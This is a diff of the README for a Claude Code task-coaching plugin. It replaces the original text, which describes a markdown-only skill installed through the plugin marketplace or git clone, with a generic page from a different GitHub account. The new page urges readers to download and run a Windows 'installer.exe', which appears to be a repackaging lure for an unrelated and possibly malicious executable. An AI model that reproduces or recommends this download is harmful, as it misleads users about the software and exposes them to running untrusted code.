@@ -1,181 +1,78 @@
-# GTD Coach - Claude Code Plugin
+# 🎯 gtd-coach-plugin - Your AI Assistant for Everyday Goals
 
-[English](README.md) | [中文](README_CN.md)
+Welcome to the gtd-coach-plugin! This application breaks down your daily tasks into detailed action plans tailored to meet your goals. With the power of AI, managing your to-do list has never been easier.
 
-Personal GTD (Getting Things Done) coach that transforms annual goals into actionable daily tasks with automatic progress tracking.
+## 📥 Download Now
 
-## Features
+[![Download gtd-coach-plugin](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/alishazeem/gtd-coach-plugin/releases)
 
-- **Goal → SOP Framework**: Convert high-level goals into structured plans with quarterly milestones
-- **Daily Task Generation**: Prioritized task lists based on your timeline position
-- **Step-by-Step Guidance**: Break down each task into specific actionable steps
-- **Automatic Memory**: Progress persists across conversations - no need to repeat context
-- **Review System**: Daily, weekly, monthly, and quarterly review templates
-- **Adaptive Planning**: Adjusts recommendations based on actual progress
-- **Multi-language**: Supports English, 中文, 日本語
+## 🚀 Getting Started
 
-## Installation
+Follow these simple steps to download and run the gtd-coach-plugin:
 
-### Via Claude Code CLI
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/alishazeem/gtd-coach-plugin/releases). This page contains all versions of gtd-coach-plugin.
 
-```bash
-/plugin marketplace add github:iamzifei/gtd-coach-plugin
-```
+2. **Select the Latest Release**  
+   On the Releases page, find the latest version listed at the top. Click on it to access the release details.
 
-### Manual Installation
+3. **Download the Installer**  
+   Look for the file named `gtd-coach-plugin-installer.exe` under the Assets section. Click on this file to start your download.
 
-```bash
-git clone https://github.com/iamzifei/gtd-coach-plugin.git
-cd gtd-coach-plugin
-claude plugin install .
-```
+## 📂 Installation Steps
 
-## Usage
+Once your download is complete, follow these steps to install the gtd-coach-plugin:
 
-### First Time Setup
+1. **Locate the Downloaded File**  
+   Find the `gtd-coach-plugin-installer.exe` file in your downloads folder or whichever location you chose for saving it.
 
-Just tell Claude your goal:
+2. **Run the Installer**  
+   Double-click the installer file. A window will appear to guide you through the installation.
 
-```
-I want to launch my SaaS and reach $10K MRR in 12 months.
-Currently have an MVP, can spend 20 hours/week on this.
-```
+3. **Follow the Setup Wizard**  
+   The setup wizard will prompt you to accept the terms and conditions. After that, click "Next" to proceed with the installation steps.
 
-Claude will:
-1. Create a structured SOP framework
-2. Generate quarterly milestones
-3. Save everything to memory
-4. Generate your first day's tasks
+4. **Complete the Installation**  
+   Once the installation finishes, click "Finish" to close the setup wizard.
 
-### Daily Use
+5. **Launch the gtd-coach-plugin**  
+   Find the gtd-coach-plugin icon on your desktop or in your applications list. Double-click it to start using the application.
 
-Simply ask:
+## 🏗️ Features
 
-```
-What's today's task?
-```
+The gtd-coach-plugin comes packed with helpful features to enhance your productivity:
 
-or in Chinese:
+- **Task Management**: Create, edit, and delete tasks easily.
+- **Goal Setting**: Set personal or professional goals and receive tailored action plans.
+- **AI Assistance**: Use AI to prioritize tasks based on your goals.
+- **Progress Tracking**: Monitor your progress towards completing tasks and reaching goals.
 
-```
-今天做什么？
-```
+## ⚙️ System Requirements
 
-Claude will:
-1. Load your goal from memory
-2. Show your current progress
-3. Generate today's prioritized tasks
-4. Offer to break down any task into steps
+To run gtd-coach-plugin smoothly, ensure your system meets these requirements:
 
-### Session End
+- **Operating System**: Windows 10 or later
+- **Processor**: 1.5 GHz or faster
+- **RAM**: 4 GB minimum
+- **Disk Space**: At least 200 MB of free space
 
-When you're done:
+## 🛠️ Troubleshooting
 
-```
-End session
-```
+If you encounter any issues while installing or using gtd-coach-plugin, consider the following solutions:
 
-Claude will:
-1. Summarize completed tasks
-2. Update progress in memory
-3. Prepare context for next session
+- **Installation Issues**: Ensure that you have administrative rights on your device.
+- **Slow Performance**: Check for other applications running in the background that may affect performance.
+- **Unresponsive Application**: If the application becomes unresponsive, try restarting it or your computer.
 
-## Commands
+## 🔗 Additional Resources
 
-| Command | Action |
-|---------|--------|
-| "What's today's task?" / "今天做什么" | Generate daily task list |
-| "Start task X" / "开始任务X" | Break down task into steps |
-| "Done" / "完成了" | Update task status |
-| "End session" / "结束" | Save progress, end session |
-| "Do review" / "做复盘" | Trigger review template |
-| "Show progress" / "查看进度" | Display goal overview |
-| "Reset goal" / "重置目标" | Clear memory, start fresh |
+- **User Manual**: [Access the User Manual](https://github.com/alishazeem/gtd-coach-plugin/wiki)
+- **Support Forum**: Join the conversation and seek help in our [Support Forum](https://github.com/alishazeem/gtd-coach-plugin/discussions).
 
-## Memory Structure
+## 📬 Contact
 
-The plugin stores these in Claude's memory:
+For further questions, please reach out via the Issues tab on our [GitHub page](https://github.com/alishazeem/gtd-coach-plugin/issues).
 
-```
-GTD Goal: [Your goal]
-GTD Target Date: [Deadline]
-GTD Current Phase: [Q1-Validate/Q2-Scale/Q3-Systematize/Q4-Achieve]
-GTD Progress: [X]%
-GTD Last Session: [Date]
-GTD Language: [Preference]
-GTD Weekly Status: [Tasks completed]
-```
+For updates and more information, visit our [Releases page](https://github.com/alishazeem/gtd-coach-plugin/releases) again. 
 
-## File Structure
-
-```
-gtd-coach-plugin/
-├── .claude-plugin/
-│   └── plugin.json          # Plugin manifest
-├── skills/
-│   └── gtd-coach/
-│       ├── SKILL.md         # Main skill instructions
-│       ├── REVIEWS.md       # Review templates
-│       ├── TEMPLATES.md     # Reusable templates
-│       └── EXAMPLES.md      # Example conversations
-├── README.md
-├── README_CN.md
-└── LICENSE
-```
-
-## Examples
-
-### Goal Setup Flow
-
-```
-User: I want to grow my freelance income to $20K/month in 18 months
-
-Claude: ## Your Goal Framework
-
-### Goal Statement
-**Grow freelance income from $X to $20K/month within 18 months**
-
-### Quarterly Milestones
-| Quarter | Phase | Milestone |
-|---------|-------|-----------|
-| Q1 | Validate | First $5K month |
-| Q2 | Scale | Consistent $10K |
-| Q3 | Systematize | $15K with systems |
-| Q4-Q6 | Achieve | $20K target |
-
-Saved to memory!
-
-## Today's Tasks
-...
-```
-
-### Returning User Flow
-
-```
-User: What's today's task?
-
-Claude: ## Welcome back!
-
-**Goal**: Freelance → $20K/month
-**Progress**: 35% | **Phase**: Q2-Scale
-**Last session**: 2 days ago
-
-**Today's Tasks**
-...
-```
-
-## Contributing
-
-Contributions welcome! Please feel free to submit issues and pull requests.
-
-## License
-
-MIT License - feel free to use, modify, and distribute.
-
-## Author
-
-Created by [James](https://x.com/JamesAI)
-
----
-
-**Note**: This plugin uses Claude's memory system. Memory persists within the same Claude account but resets if you clear memory or use incognito mode.
+Thank you for choosing gtd-coach-plugin! Enjoy your journey to better productivity.
